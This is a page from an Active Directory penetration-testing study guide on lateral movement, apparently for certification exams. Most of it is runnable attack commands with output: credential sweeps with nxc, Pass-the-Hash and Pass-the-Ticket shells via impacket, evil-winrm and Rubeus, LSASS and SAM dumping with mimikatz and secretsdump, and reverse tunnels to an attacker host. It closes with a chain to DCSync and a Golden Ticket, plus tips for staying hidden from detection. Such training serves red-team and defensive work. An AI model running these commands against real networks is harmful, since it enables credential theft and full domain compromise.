---
layout: default
title: "Lateral Movement (PtH / PtT / OverPtH)"
order: 6
phase: "LATERAL"
tactic: "Lateral Movement"
summary: "Move between hosts with Pass-the-Hash, Pass-the-Ticket, OverPass-the-Hash and remote-exec (WinRM/SMB/WMI/RDP), pivoting toward the DC."
---

{% include ad_nav.html %}

# Lateral Movement

## Pre-requisites

<div class="badges">
  <span class="badge req">A credential material: password / NT hash / Kerberos ticket / AES key</span>
  <span class="badge req">Local admin (or a service) on the target host</span>
  <span class="badge req">SMB 445 / WinRM 5985 / RPC 135 / RDP 3389 reachable</span>
</div>

## Mechanism & Theory

Windows authentication lets you present **secondary credential material** without the plaintext password:

- **Pass-the-Hash (PtH):** the NTLM protocol uses the NT hash directly — you never need the plaintext.
- **OverPass-the-Hash (Pass-the-Key):** turn an NT hash / AES key into a **Kerberos TGT**, then use Kerberos everywhere.
- **Pass-the-Ticket (PtT):** inject a stolen/forged `.ccache`/`.kirbi` TGT/TGS into your session and authenticate as that identity.

The goal is to reuse harvested material to execute code on new hosts, dump their secrets, and repeat until you reach a Domain Admin session or the DC.

<div class="attack-diagram">
  <div class="diag-title">Lateral Movement — reuse material, hunt DA sessions, reach the DC</div>
  <div class="diag-flow">
    <div class="diag-node start"><span class="n-step">STEP 1</span><span class="n-title">Cred / hash / ticket</span><span class="n-tool">from roast / dump</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 2</span><span class="n-title">Find (Pwn3d!) host</span><span class="n-tool">nxc sweep</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 3</span><span class="n-title">PtH / OverPtH</span><span class="n-tool">wmiexec / getTGT</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 4</span><span class="n-title">Dump LSASS</span><span class="n-tool">secretsdump / mimikatz</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 5</span><span class="n-title">Steal DA ticket</span><span class="n-tool">sekurlsa::tickets</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node win"><span class="n-step">STEP 6</span><span class="n-title">PtT to DC</span><span class="n-tool">SYSTEM on DC</span></div>
  </div>
</div>

## Step 0 — Validate access &amp; find where you're admin

```bash
export DC=10.10.10.100 ; export DOMAIN=corp.local
# Sweep a subnet with a credential; (Pwn3d!) = local admin
nxc smb 10.10.10.0/24 -u svc_sql -p 'P@ssw0rd2022' --continue-on-success
nxc smb 10.10.10.0/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
# Check WinRM reachability
nxc winrm 10.10.10.0/24 -u svc_sql -p 'P@ssw0rd2022'
```

```terminal
SMB   10.10.10.20  445  DB01     [+] corp.local\svc_sql:P@ssw0rd2022 (Pwn3d!)
SMB   10.10.10.21  445  WEB01    [+] corp.local\svc_sql:P@ssw0rd2022
WINRM 10.10.10.20  5985 DB01     [+] corp.local\svc_sql:P@ssw0rd2022 (Pwn3d!)
```

## Pass-the-Hash (PtH)

```bash
# Remote shells with just the NT hash
evil-winrm -i 10.10.10.20 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
impacket-psexec  administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
impacket-wmiexec administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
impacket-smbexec administrator@10.10.10.20 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
# Run a command across many hosts
nxc smb 10.10.10.0/24 -u administrator -H 31d6cfe0d16ae... -x 'whoami' --continue-on-success
```

<div class="callout info">
  <span class="callout-title">psexec vs wmiexec vs smbexec</span>
  <strong>psexec</strong> = SYSTEM, drops a service (loud, may hit AV). <strong>wmiexec</strong> = semi-interactive, quieter, no binary dropped. <strong>smbexec</strong> = similar to wmiexec via services. Prefer wmiexec/atexec when stealth matters.
</div>

## OverPass-the-Hash (Pass-the-Key) — hash ➜ Kerberos TGT

```bash
# Impacket: get a TGT from an NT hash (RC4) or AES key
impacket-getTGT $DOMAIN/administrator -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip $DC
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.$DOMAIN

# AES key variant (stealthier, avoids RC4 downgrade detections)
impacket-getTGT $DOMAIN/administrator -aesKey <AES256_KEY> -dc-ip $DC
```

```powershell
# Windows / Rubeus & mimikatz
.\Rubeus.exe asktgt /user:administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
sekurlsa::pth /user:administrator /domain:corp.local /ntlm:31d6cfe0... /run:powershell.exe
```

## Pass-the-Ticket (PtT)

```bash
# Use a captured/forged ccache directly
export KRB5CCNAME=/path/to/administrator.ccache
klist
impacket-wmiexec -k -no-pass administrator@dc01.$DOMAIN

# Convert between formats if needed
impacket-ticketConverter administrator.kirbi administrator.ccache
```

```powershell
# Rubeus: inject a .kirbi into the current logon session
.\Rubeus.exe ptt /ticket:administrator.kirbi
klist
```

## Harvesting more material on a host you own

```bash
# Remote secrets (SAM + LSA + cached domain creds) with admin
impacket-secretsdump administrator@10.10.10.20 -hashes :31d6cfe0d16ae...
nxc smb 10.10.10.20 -u administrator -H 31d6cfe0d16ae... --sam --lsa --dpapi
```

```powershell
# On-host with mimikatz: dump logon passwords, tickets, and keys from LSASS
privilege::debug
sekurlsa::logonpasswords
sekurlsa::ekeys
sekurlsa::tickets /export
```

nxc subnet sweep + local secrets harvest (typical foothold-to-hash flow):

```terminal
$ nxc smb 10.10.10.0/24 -u svc_sql -p 'P@ssw0rd2022' --continue-on-success
SMB  10.10.10.20  445  DB01   [+] corp.local\svc_sql:P@ssw0rd2022 (Pwn3d!)
SMB  10.10.10.21  445  WEB01  [+] corp.local\svc_sql:P@ssw0rd2022

$ impacket-secretsdump corp.local/svc_sql:'P@ssw0rd2022'@10.10.10.20
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
[*] Dumping cached domain logon information
CORP.LOCAL/j.admin:$DCC2$10240#j.admin#a1b2...   <- a Domain Admin logged in here!
```

## RDP & WinRM interactive access

```bash
# RDP with restricted-admin PtH (if enabled), or plaintext
xfreerdp /v:10.10.10.20 /u:administrator /pth:31d6cfe0d16ae... /cert:ignore
xfreerdp /v:10.10.10.20 /u:administrator /p:'P@ssw0rd2022' /cert:ignore /dynamic-resolution
# WinRM
evil-winrm -i 10.10.10.20 -u svc_sql -p 'P@ssw0rd2022'
```

## Pivoting / tunnelling to reach internal hosts

```bash
# ligolo-ng (modern, reliable)
# attacker: ./proxy -selfcert   ; agent on foothold: ./agent -connect <ATTACKER>:11601
# then route the internal subnet through the ligolo interface

# chisel SOCKS
# attacker: ./chisel server -p 8000 --reverse
# foothold: ./chisel client <ATTACKER>:8000 R:socks
proxychains4 nxc smb 172.16.5.0/24 -u administrator -H 31d6cfe0...
```

## Complete Attack Chain

```terminal
[1] Kerberoast ─► svc_sql : P@ssw0rd2022
[2] nxc sweep  ─► svc_sql is (Pwn3d!) on DB01
[3] secretsdump DB01 ─► local Administrator NT hash + cached DA session
        (sekurlsa::logonpasswords reveals DA "j.admin" logged in on DB01)
[4] OverPtH / PtT as j.admin:
        getTGT j.admin (or extract j.admin ticket from LSASS) ─► j.admin.ccache
[5] PtT to the DC:
        KRB5CCNAME=j.admin.ccache ; wmiexec -k dc01.corp.local ─► SYSTEM on DC
        │
        ▼
[6] DCSync ─► krbtgt ─► Golden Ticket ─► total domain compromise
```

<div class="callout tip">
  <span class="callout-title">The classic pivot</span>
  Local admin on a box + a Domain Admin logged into that box = game over. Dump LSASS, steal the DA's ticket/hash, Pass-the-Ticket to the DC. This "hunt for admin sessions" (BloodHound <code>HasSession</code>) is the most common lateral path on exams.
</div>

<div class="callout opsec">
  <span class="callout-title">Detection</span>
  psexec service creation = <strong>Event ID 7045</strong> + 4624/4672 logons. RC4 OverPtH shows encryption type <code>0x17</code>. Prefer AES keys, wmiexec/atexec, and minimal ticket lifetime on real ops.
</div>

## Key Takeaways

- Hash, key or ticket — all three let you authenticate without the plaintext.
- OverPtH converts NTLM into Kerberos so you can Pass-the-Ticket to the DC.
- Always dump LSASS/secrets on each new host to harvest the next hop (especially DA sessions).

{% include toc_sidebar.html %}
